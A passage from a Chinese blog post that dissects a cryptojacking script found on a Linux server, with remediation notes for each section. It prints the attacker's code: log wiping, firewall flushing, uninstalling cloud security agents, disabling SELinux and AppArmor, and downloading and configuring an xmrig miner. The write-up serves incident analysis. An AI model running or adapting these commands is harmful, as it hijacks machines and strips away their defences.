line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("export RRHOME=/etc/.system/php\nrm -rf $RRHOME\nmkdir $RRHOME -p\n\nrm -rf /var/log/syslog\nchattr -iua /tmp/     # 允许对 /tmp/ 目录进行修改、更新和追加操作\nchattr -iua /var/tmp/ # 使用 chattr 命令修改 /var/tmp/ 目录的属性，取消不可修改、不可更新和不可追加属性。\nufw disable #  关闭Ubuntu的防火墙， Uncomplicated Firewall（UFW），这是一个用于配置 iptables 防火墙规则的前端工具。\niptables -F  # iptables -F是用于清除所有的防火墙规则和计数器，即将所有的iptables规则设置为默认值，从而可以清空当前的防火墙策略。\nsudo sysctl kernel.nmi_watchdog=0\nsysctl kernel.nmi_watchdog=0\necho '0' > /proc/sys/kernel/nmi_watchdog\necho 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf\n这一系列操作似乎是用于禁用 NMI（Non-Maskable Interrupt）看门狗，在某些情况下可以防止系统被死锁等问题影响。\n\nchattr -iae /root/.ssh/\nchattr -iae /root/.ssh/authorized_keys\nrm -rf /tmp/addres*\nrm -rf /tmp/walle*\nrm -rf /tmp/keys\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br")])]),a("h3",{attrs:{id:"解决方法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决方法"}},[s._v("#")]),s._v(" 解决方法")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("vi /etc/sysctl.conf\nkernel.nmi_watchdog=0 去掉\n\necho '1' > /proc/sys/kernel/nmi_watchdog\n\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"_6-关闭某云的安全软件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_6-关闭某云的安全软件"}},[s._v("#")]),s._v(" 6.关闭某云的安全软件")]),s._v(" "),a("h3",{attrs:{id:"恶意代码-6"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码-6"}},[s._v("#")]),s._v(" 恶意代码：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("if ps aux | grep -i '[a]liyun'; then\n  curl http://update.aegis.aliyun.com/download/uninstall.sh | bash\n  curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash\n  pkill aliyun-service\n  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service\n  rm -rf /usr/local/aegis*\n  systemctl stop aliyun.service\n  systemctl disable aliyun.service\n  service bcm-agent stop\n  yum remove bcm-agent -y\n  apt-get remove bcm-agent -y\nelif ps aux | grep -i '[y]unjing'; then\n  /usr/local/qcloud/stargate/admin/uninstall.sh\n  /usr/local/qcloud/YunJing/uninst.sh\n  /usr/local/qcloud/monitor/barad/admin/uninstall.sh\nfi\n\nif [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then\n  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor  \nelse\n  export ARCH=amd64\n  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} ]; then\n    /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} stop && /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} uninstall && rm -rf /usr/local/cloudmonitor \n  else\n    echo \"ali cloud monitor not running\"\n  fi\nfi\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br")])]),a("h3",{attrs:{id:"解决-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决-3"}},[s._v("#")]),s._v(" 解决")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("这条没有生效，某的监控还是在运行\n\n# ps aux | grep -i '[a]liyun'\nroot     13457  0.5  0.2 101296  8900 ?        S<sl Mar31 1000:29 /usr/local/aegis/aegis_client/aegis_11_55/AliYunDun\nroot     13467  1.7  0.7 145768 26980 ?        S<sl Mar31 3579:27 /usr/local/aegis/aegis_client/aegis_11_55/AliYunDunMonitor\nroot     15055  0.0  0.1  43464  4528 ?        S<sl May15 121:01 /usr/local/aegis/aegis_update/AliYunDunUpdate\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"_7-禁用selinux-以及关闭aliyun-service"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_7-禁用selinux-以及关闭aliyun-service"}},[s._v("#")]),s._v(" 7.禁用SELinux 以及关闭aliyun.service")]),s._v(" "),a("h3",{attrs:{id:"恶意代码-7"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码-7"}},[s._v("#")]),s._v(" 恶意代码：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("setenforce 0\necho SELINUX=disabled >/etc/selinux/config\nservice apparmor stop\nsystemctl disable apparmor\nservice aliyun.service stop\nsystemctl disable aliyun.service\nps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %\nps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %\nrm -rf /usr/local/aegis\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("解释")]),s._v(" "),a("h3",{attrs:{id:"解决-4"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决-4"}},[s._v("#")]),s._v(" 解决")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("setenforce 0\necho SELINUX=disabled >/etc/selinux/config\n都是\n恢复之前的文件：\n\n# vi /etc/selinux/config\n\nSELINUX=disabled\nSELINUXTYPE=targeted\n\nsystemctl disable apparmor\n恢复，本机没有安装，所以不生效。\nsystemctl status apparmor\nsystemctl enable apparmor\n\nservice aliyun.service stop\nsystemctl disable aliyun.service\n恢复：\nsystemctl start aliyun.service\nsystemctl status aliyun.service\nsystemctl enable aliyun.service\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br")])]),a("p",[s._v("aegis目录没有被删掉。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# ll /usr/local/aegis\ntotal 28\ndrwxr-xr-x 5 root root 4096 Mar 31 21:31 aegis_client\nsrwxr-xr-x 1 root root    0 Mar 31 21:31 Aegis-<Guid(5A2C30A2-A87D-490A-9281-6765EDAD7CBA)>\ndrwxr-xr-x 3 root root 4096 May 15 11:50 aegis_update\ndrwxr-xr-x 3 root root 4096 Feb 10  2023 AliSecGuard\ndrwxr-xr-x 5 root root 4096 Aug 17 11:55 globalcfg\ndrwxr-xr-x 8 root root 4096 Aug 17 13:24 PythonLoader\ndrwxr-xr-x 7 root root 4096 Apr 24 10:18 PythonLoaderTemp\ndrwxr-xr-x 3 root root 4096 Dec 19  2021 SecureCheck\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("h2",{attrs:{id:"_8-安装-mining-脚本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_8-安装-mining-脚本"}},[s._v("#")]),s._v(" 8.安装 mining 脚本")]),s._v(" "),a("h3",{attrs:{id:"恶意代码-8"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码-8"}},[s._v("#")]),s._v(" 恶意代码")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('#set up RR mining script\n\nif [ "$(id -u)" == "0" ]; then\n  echo "WARNING: Generally it is not adviced to run this script under root"\nfi\n\nWALLET=123456789abcd #做了处理\nEMAIL=$1 # this one is optional\n\n# active 1GB pages\nsysctl -w vm.nr_hugepages=$(nproc)\n\nfor i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);\ndo\n    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";\ndone\n\necho "1GB pages successfully enabled"\n\n# checking prerequisites\n\nif [ -z $WALLET ]; then\n  echo "Script usage:"\n  echo "> setup_rr_miner.sh <wallet address> [<your email address>]"\n  echo "ERROR: Please specify your wallet address"\n  exit 1\nfi\n\nWALLET_BASE=`echo $WALLET | cut -f1 -d"."`\nif [ ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then\n  echo "ERROR: Wrong wallet base address length (should be 95 or 34): ${#WALLET_BASE}"\n  exit 1\nfi\n\nif [ -z $RRHOME ]; then\n  echo "ERROR: Please define HOME environment variable to your home directory"\n  exit 1\nfi\n\nif [ ! -d $RRHOME ]; then\n  echo "ERROR: Please make sure HOME directory $RRHOME exists or set it yourself using this command:"\n  echo \'  export RRHOME=<dir>\'\n  exit 1\nfi\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br")])]),a("h3",{attrs:{id:"解释"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解释"}},[s._v("#")]),s._v(" 解释：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('#set up RR mining script\n\nif [ "$(id -u)" == "0" ]; then\n  echo "WARNING: Generally it is not adviced to run this script under root"\nfi\n判断用户如果是root，弹出警告，不建议用root用户运行。\n\nWALLET=123456789abcd #做了处理\nEMAIL=$1 # this one is optional\n\n# active 1GB pages\nsysctl -w vm.nr_hugepages=$(nproc)\n\nfor i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);\ndo\n    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";\ndone\n\necho "1GB pages successfully enabled"\n这段代码的目的是在系统上启用 1GB 大页面（Huge Pages），以提高大内存工作负载的性能和效率。它通过设置 Huge Pages 数目并针对每个 NUMA 节点进行配置来实现这一目标。这可能是在进行内存优化和性能调整时使用的一部分脚本。\n\n\n# checking prerequisites\n\nif [ -z $WALLET ]; then\n  echo "Script usage:"\n  echo "> setup_rr_miner.sh <wallet address> [<your email address>]"\n  echo "ERROR: Please specify your wallet address"\n  exit 1\nfi\n这段代码用于检查用户在执行脚本时是否提供了有效的钱包地址（通过检查变量 $WALLET 是否为空）。如果用户未提供钱包地址，脚本将输出使用说明和示例命令，并输出错误消息，然后终止执行。这有助于确保脚本在正确的输入参数下才会继续执行，避免因缺少必要的信息而导致问题。\n\n\nWALLET_BASE=`echo $WALLET | cut -f1 -d"."`\nif [ ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then\n  echo "ERROR: Wrong wallet base address length (should be 95 or 34): ${#WALLET_BASE}"\n  exit 1\nfi\n这段代码用于检查给定的钱包地址的基本部分的长度是否符合要求。如果长度既不是 95 也不是 34，脚本将输出错误消息，并终止执行。\n\nif [ -z $RRHOME ]; then\n  echo "ERROR: Please define HOME environment variable to your home directory"\n  exit 1\nfi\n这段代码用于检查是否定义了环境变量 $RRHOME，并在该变量未定义时输出错误消息，然后终止执行\n\nif [ ! -d $RRHOME ]; then\n  echo "ERROR: Please make sure HOME directory $RRHOME exists or set it yourself using this command:"\n  echo \'  export RRHOME=<dir>\'\n  exit 1\nfi\n跟上一段差不多。\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br")])]),a("h3",{attrs:{id:"解决-5"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决-5"}},[s._v("#")]),s._v(" 解决")]),s._v(" "),a("p",[s._v("基本只是检查条件，不需要安全操作")]),s._v(" "),a("h2",{attrs:{id:"_9-安装curl-wget"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_9-安装curl-wget"}},[s._v("#")]),s._v(" 9.安装curl, wget")]),s._v(" "),a("p",[s._v("如果没有安装则安装 curl, wget")]),s._v(" "),a("h3",{attrs:{id:"恶意代码-9"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码-9"}},[s._v("#")]),s._v(" 恶意代码")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('#check curl, wget\nif ! command -v curl &> /dev/null\nthen\n    echo "curl could not be found, will install..."\n    apt-get install curl -y\n    yum install curl -y\nfi\nif ! command -v wget &> /dev/null\nthen\n    echo "wget could not be found, will install..."\n    apt-get install wget -y\n    yum install wget -y\nfi\n\nif ! type lscpu >/dev/null; then\n  echo "WARNING: This script requires \\"lscpu\\" utility to work correctly"\nfi\n这段代码用于检查是否安装了名为 lscpu 的命令行工具。如果未安装，脚本将输出警告消息，提醒用户脚本需要该工具才能正常运行。\n# lscpu -V\n# lscpu from util-linux 2.23.2\n\nif ! sudo -n true 2>/dev/null; then\n  echo "Since I can\'t do passwordless sudo, mining in background will started from your $RRHOME/.profile file first time you login this host after reboot."\nelse\n  echo "Mining in background will be performed using moneroocean_miner systemd service."\nfi\n这段代码用于检查是否可以进行无密码 sudo，根据结果输出不同的消息。如果无法进行无密码 sudo，则说明后台挖矿将在用户首次登录主机后通过 .profile 文件启动。如果可以进行无密码 sudo，则说明后台挖矿将使用 systemd 服务来执行。\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br")])]),a("h3",{attrs:{id:"解决-6"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决-6"}},[s._v("#")]),s._v(" 解决")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("无需操作\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"_10-安装挖矿软件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_10-安装挖矿软件"}},[s._v("#")]),s._v(" 10.安装挖矿软件")]),s._v(" "),a("h3",{attrs:{id:"恶意代码和解释"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码和解释"}},[s._v("#")]),s._v(" 恶意代码和解释")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('# start doing stuff: preparing miner\n\necho "[*] Removing previous rr miner (if any)"\nif sudo -n true 2>/dev/null; then\n  sudo systemctl stop xmrig.service\nfi\nkillall -9 xmrig\n\n这段代码用于移除之前可能存在的 RR 矿工（RiskReward 矿工），首先尝试通过无密码 sudo 停止相关的 systemd 服务（如果条件成立），然后通过 killall 命令强制终止 xmrig 进程。\n\necho "[*] Looking for the latest version of Xmrig miner"\nLATEST_XMRIG_LINUX_RELEASE="https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz"\necho "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"\nif ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then\n  echo "ERROR: Can\'t download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"\n  exit 1\nfi\n这段代码用于从指定的链接下载最新版本的 Xmrig 矿工软件，将其保存到临时文件 /tmp/xmrig.tar.gz。如果下载失败，脚本将输出错误消息并终止执行。\n\n\necho "[*] Unpacking /tmp/xmrig.tar.gz to $RRHOME"\nif ! tar xf /tmp/xmrig.tar.gz -C $RRHOME --strip=1; then\n  echo "WARNING: Can\'t unpack /tmp/xmrig.tar.gz to $RRHOME directory"\nfi\nrm /tmp/xmrig.tar.gz\n\n这段代码用于解压缩下载的 Xmrig 矿工软件并将其放置到指定目录 $RRHOME 中。如果解压缩失败，脚本将输出警告消息。\n\nchmod +x $RRHOME/xmrig\nchmod +x $RRHOME/config.json\n\necho "[*] Miner $RRHOME/xmrig is OK"\n\nsed -i \'s/"url": *"[^"]*",/"url": "XXX.XXXXXXX.com:5555",/\' $RRHOME/config.json\nsed -i \'s/"1gb-pages": *false,/"1gb-pages": true,/\' $RRHOME/config.json\nsed -i \'s/"algo": *null,/"algo": "gr",/\' $RRHOME/config.json\nsed -i \'s/"tls": *false,/"tls": true,/\' $RRHOME/config.json\nsed -i \'s/"keepalive": *false,/"keepalive": true,/\' $RRHOME/config.json\nsed -i \'s/"user": *"[^"]*",/"user": "\'$WALLET\'.0x22",/\' $RRHOME/config.json\nsed -i \'s/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 